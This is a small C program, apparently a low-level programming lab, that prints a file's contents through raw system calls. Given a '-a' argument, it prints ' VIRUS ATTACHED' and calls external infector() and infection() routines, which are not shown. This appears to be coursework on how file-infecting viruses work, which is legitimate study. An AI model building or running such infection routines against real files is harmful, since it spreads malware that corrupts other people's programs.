#include "util.h"

#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_READ 3
#define SYS_WRITE 4
#define O_RDONLY 0
#define SYS_EXIT 1
#define STDOUT 1
extern int system_call();

void print_file_content(const char *filename) {
    int fd, nread;
    char buffer[8192];

    fd = system_call(SYS_OPEN, filename, O_RDONLY);
    if (fd < 0) {
        system_call(SYS_WRITE, 2, "Error opening file.\n", 20);
        system_call(SYS_EXIT, 0x55);
    }

    while ((nread = system_call(SYS_READ, fd, buffer, sizeof(buffer))) > 0) {
        system_call(SYS_WRITE, 1, buffer, nread);
    }

    system_call(SYS_CLOSE, fd);
}

int main(int argc, char *argv[]) {
    char* prefix = 0;

    int i;
    
    if (argc != 2) {
        system_call(SYS_WRITE, 2, "Usage: ./program <filename>\n", 28);
        return 0x55;
    }

    for(i = 1; i < argc; i++)
    {
        if(strncmp(argv[i], "-a", 2) == 0)
        {
            prefix = argv[i] + 2;
            system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED\n", strlen(" VIRUS ATTACHED\n"));
            infector(prefix);
            infection();
        }
        else
        {
            print_file_content(argv[i]);
        }
    }
    
    return 0;
}